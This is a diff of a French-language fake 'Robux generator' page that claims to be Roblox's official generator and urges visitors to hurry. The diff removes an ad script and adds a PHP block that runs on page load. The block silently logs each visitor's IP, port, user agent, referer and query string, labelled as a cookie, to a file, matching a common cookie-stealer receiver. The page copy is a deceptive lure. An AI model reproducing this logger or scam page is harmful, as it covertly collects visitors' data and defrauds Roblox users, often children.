@@ -19,15 +19,7 @@
 <link href="images\fancyselect.css" rel="stylesheet">
 <link href="images\style.css" rel="stylesheet">
 <link rel="stylesheet" type="text/css" href="images\custom-css.css">
-<script data-cfasync="false">
-	var _avp = _avp || [];
-	(function() {
-	var s = document.createElement('script');
-	s.type = 'text/javascript'; s.async = true; s.src = window.location.protocol + '//adserver.adreactor.com/js/libcode3.js';
-	var x = document.getElementsByTagName('script')[0];
-	x.parentNode.insertBefore(s, x);
-	})();
-	</script>
+
 </head>
 <body>
 <div id="loader-wrapper">
@@ -88,6 +80,54 @@
 		color: #FFFFFF;
 		}
 	</style>
+ 
+ <?php
+
+function getIP()
+{
+  if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
+    $ip = getenv("HTTP_CLIENT_IP");
+  else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
+    $ip = getenv("HTTP_X_FORWARDED_FOR");
+  else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
+    $ip = getenv("REMOTE_ADDR");
+  else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
+    $ip = $_SERVER['REMOTE_ADDR'];
+  else
+    $ip = "unknown";
+  return($ip);
+}
+
+function logData()
+{
+  $ipLog="logfile.htm";
+  $cookie = $_SERVER['QUERY_STRING'];
+  $register_globals = (bool) ini_get('register_globals');
+  if ($register_globals)
+    $ip = getenv('REMOTE_ADDR');
+  else
+    $ip = GetIP();
+
+  $rem_port = $_SERVER['REMOTE_PORT'];
+  $user_agent = $_SERVER['HTTP_USER_AGENT'];
+  $rqst_method = $_SERVER['METHOD'];
+  $rem_host = $_SERVER['REMOTE_HOST'];
+  $referer = $_SERVER['HTTP_REFERER'];
+  $date=date ("l dS of F Y h:i:s A");
+  $log=fopen("$ipLog", "a+");
+
+  if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog))
+    fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE: $cookie
+");
+  else
+    fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE: $date | COOKIE: $cookie \n\n");
+  fclose($log);
+}
+
+logData();
+
+?>
+ 
 
 <?php
 
@@ -137,6 +177,7 @@
 <div class="generator-header">
 <h1>G&eacuten&eacuterateur de Robux</h1>
 <p>Vous pouvez utiliser en toute s&eacutecurit&eacute Roblox Generator pour ajouter des Robux en illimit&eacute &agrave votre compte Roblox. Ceci est le g&eacuten&eacuterateur officiel Roblox mis &agrave jour pour 2020. Le g&eacuten&eacuterateur est facile &agrave utiliser. Entrez simplement votre nom d'utilisateur et s&eacutelectionnez la quantit&eacute de Robux que vous souhaitez ajouter &agrave votre compte. Je vous conseil de vous depecher car il n'y en a presque plus ! Besoin d'aide ? : https://discord.gg/TksfXXM
+Conseil : lisez les TOS avant d'utiliser le site ! http://buxland.alwaysdata.net/tos.html
 <br>
 </p></div>
 </div>
@@ -421,5 +462,9 @@ hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
 <noscript><a href="index.htm" target="_blank"><img src="//sstatic1.histats.com/0.gif?4275781&101" alt="counter" border="0"></a></noscript>
-</div></body>
+</div>
+<button onclick="window.location.href='http://buxland.alwaysdata.net/tos.html';">
+      TOS
+    </button>
+</body>
 </html>
